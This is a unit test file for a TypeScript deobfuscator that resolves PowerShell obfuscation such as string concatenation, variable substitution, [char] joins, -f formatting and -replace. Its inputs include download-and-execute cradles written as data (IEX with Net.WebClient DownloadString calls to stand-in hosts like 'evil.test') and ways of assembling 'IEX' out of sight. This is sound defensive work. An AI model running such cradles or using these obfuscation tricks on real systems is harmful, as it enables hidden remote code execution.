// shared/analyzer/__tests__/resolve.test.ts
import { describe, expect, it } from 'vitest'
import { foldConcat, resolveVars, resolve, normalize } from '../resolve'

describe('foldConcat', () => {
  it('collapses a chain of string-literal concatenations', () => {
    expect(foldConcat("'IE'+'X'")).toBe("'IEX'")
    expect(foldConcat("'Down'+'load'+'String'")).toBe("'DownloadString'")
  })
  it('preserves non-foldable tokens around a concat', () => {
    expect(foldConcat("IEX ('Ne'+'w')")).toBe("IEX ( 'New' )")
  })
  it('leaves a lone string untouched (no + operator)', () => {
    expect(foldConcat("'http://a/x'")).toBe("'http://a/x'")
  })
  it('does not fold across a non-string operand (refuses)', () => {
    // $x is not a literal → the + chain is not foldable; leave tokens as-is
    expect(foldConcat("'a'+$x")).toBe("'a' + $x")
  })
  it('escapes embedded single quotes when re-quoting a folded value', () => {
    // 'can''t' lexes to value `can't`; folded with 'stop' → `can'tstop`; re-quoted with '' escaping
    expect(foldConcat("'can''t'+'stop'")).toBe("'can''tstop'")
  })
})

describe('resolveVars', () => {
  it('substitutes a variable bound once to a string literal', () => {
    // $u = 'http://a/x' ; IEX $u   →   … IEX 'http://a/x'
    expect(resolveVars("$u = 'http://a/x' ; IEX $u")).toContain("IEX 'http://a/x'")
  })
  it('refuses a variable assigned twice (leaves it unsubstituted)', () => {
    const out = resolveVars("$u = 'a' ; $u = 'b' ; IEX $u")
    expect(out).toContain('IEX $u') // ambiguous → not substituted
  })
  it('leaves a variable with no literal binding alone', () => {
    expect(resolveVars('IEX $undefined')).toContain('IEX $undefined')
  })
  it('does not substitute a variable used before its assignment', () => {
    // the use precedes the only assignment → value not known yet → leave $u
    expect(resolveVars("IEX $u ; $u = 'http://evil.example'")).toContain('IEX $u')
  })
  it('escapes single quotes in a substituted variable value', () => {
    // $p lexes to value `a'b`; substituted use re-quotes with '' escaping
    expect(resolveVars("$p = 'a''b' ; IEX $p")).toContain("IEX 'a''b'")
  })
})

describe('resolve (fixpoint)', () => {
  it('resolves variable-built concatenation across statements', () => {
    const out = resolve("$a = 'http://ev' ; $b = 'il.test/x' ; $u = $a + $b ; IEX $u")
    expect(out).toContain("IEX 'http://evil.test/x'")
  })
  it('is idempotent on already-clean input', () => {
    const clean = "IEX ( New-Object Net.WebClient ) . DownloadString ( 'http://a/x' )"
    expect(resolve(clean)).toBe(resolve(resolve(clean)))
  })
})

describe('normalize', () => {
  it('matches resolve on input with no concat/vars (mere reformatting only)', () => {
    // no + concat, no $var bindings — resolve should differ from the raw input
    // only in whitespace, exactly as normalize does (the re-emit baseline).
    const input = "IEX (New-Object Net.WebClient).DownloadString('http://a/x')"
    expect(resolve(input)).toBe(normalize(input))
  })
  it('re-spaces but does not fold concatenations', () => {
    expect(normalize("'a'+'b'")).toContain('+')
    expect(normalize("'a'+'b'")).not.toBe(foldConcat("'a'+'b'"))
  })
})

describe('resolve output cap', () => {
  it('caps output size on an amplifying concat cradle', () => {
    const base = 'A'.repeat(2048)
    let src = `$v0 = '${base}'`
    for (let k = 1; k <= 12; k++) src += ` ; $v${k} = $v${k - 1} + $v${k - 1}`
    expect(resolve(src).length).toBeLessThanOrEqual(1 << 20)
  })
})

describe('resolve — [char]/-join assembly (review 2.5)', () => {
  it('folds a [char] number to its character', () => {
    expect(resolve('[char]73')).toContain('I')
  })
  it('folds a joined [char] array to a literal', () => {
    expect(resolve("([char]73,[char]69,[char]88) -join ''")).toContain('IEX')
  })
  it('leaves a non-literal join untouched', () => {
    const t = "$x -join ','"
    expect(resolve(t)).toContain('$x')
  })
  it('does not reach inside a string literal — [char]73 as DATA is preserved verbatim', () => {
    expect(resolve("'[char]73'")).toBe("'[char]73'")
  })
  it('does not misparse a hex literal inside a string as [char]0 — no NUL injection', () => {
    const out = resolve("'uses [char]0x41 casts'")
    expect(out).not.toContain(String.fromCharCode(0))
    expect(out).toContain('[char]0x41')
  })
  it('leaves [char]$x (variable operand) untouched — never guessed', () => {
    const out = resolve('[char]$x')
    expect(out).toContain('char')
    expect(out).toContain('$x')
  })
  it('does not falsely collapse a join with a mixed literal/variable array (a bare [char] element may still fold independently)', () => {
    const out = resolve("([char]73,$x) -join ''")
    expect(out).toContain('$x')
    expect(out).not.toMatch(/^'[^']*'$/) // the whole expression must not collapse to one literal
  })
})

describe('resolve — -f format operator (review 2.5)', () => {
  it('folds a literal format string + literal args', () => {
    expect(resolve("('{0}{1}{2}' -f 'I','E','X')")).toContain('IEX')
  })
  it('leaves a variable-arg -f untouched', () => {
    expect(resolve("'{0}' -f $x")).toContain('$x')
  })
  it('leaves a format-spec placeholder untouched', () => {
    const t = "'{0:X2}' -f 255"
    expect(resolve(t)).toContain('{0:X2}')
  })
  it('does not reach inside a string literal — content containing -f/{0} is preserved verbatim', () => {
    // The whole thing is ONE string token; -f and {0} here are DATA, not an
    // operator + placeholder. A raw-text regex would corrupt this; a
    // token-aware fold cannot, because it never fires without a separate
    // 'string' token, a separate '-f' bareword token, and another separate
    // 'string' token as an arg.
    expect(resolve("'use the -f flag with {0} here'")).toBe("'use the -f flag with {0} here'")
  })
})

describe('resolve — -replace fold with ReDoS guard (review 2.5)', () => {
  it('folds a plain-substring -replace', () => {
    expect(resolve("'IqqEqqX' -replace 'qq',''")).toContain('IEX')
  })
  it('does NOT fold a regex-metachar -replace (ReDoS guard) — left untouched', () => {
    const t = "'aaa' -replace '(a+)+',''"
    expect(resolve(t)).toContain('-replace')
  })
  it('does not fold -replace with an empty pattern (ambiguous substitution semantics)', () => {
    // empty-pattern regex-replace matches at every position (not the same as
    // JS split('')/join semantics) — leave unfolded rather than misrepresent it
    const t = "'abc' -replace '',''"
    expect(resolve(t)).toContain('-replace')
  })
  it('leaves a variable-subject -replace untouched (literal subject only)', () => {
    expect(resolve("$x -replace 'qq',''")).toContain('$x')
  })
  it('does not reach inside a string literal — a string CONTAINING "-replace" is preserved verbatim', () => {
    // Token-aware: this is ONE string token. A raw-text regex over the whole
    // source could mis-parse '-replace' appearing inside string payload as
    // the operator (this is exactly Task 8's NUL-injection class of bug);
    // token-aware matching can never do that because there is no separate
    // '-replace' bareword token here to match against.
    expect(resolve("'the -replace operator rocks'")).toBe("'the -replace operator rocks'")
  })
  it('folds a plain-substring .Replace() method call', () => {
    expect(resolve("'IqqEqqX'.Replace('qq','')")).toContain('IEX')
  })
  it('does NOT fold a regex-metachar .Replace() pattern (same shared guard) — left untouched', () => {
    const t = "'a.b.c'.Replace('.','')"
    expect(resolve(t)).toContain('.Replace')
  })
  it('does not reach inside a string literal — a string CONTAINING ".Replace(" is preserved verbatim', () => {
    expect(resolve("'call .Replace(x,y) here'")).toBe("'call .Replace(x,y) here'")
  })
})
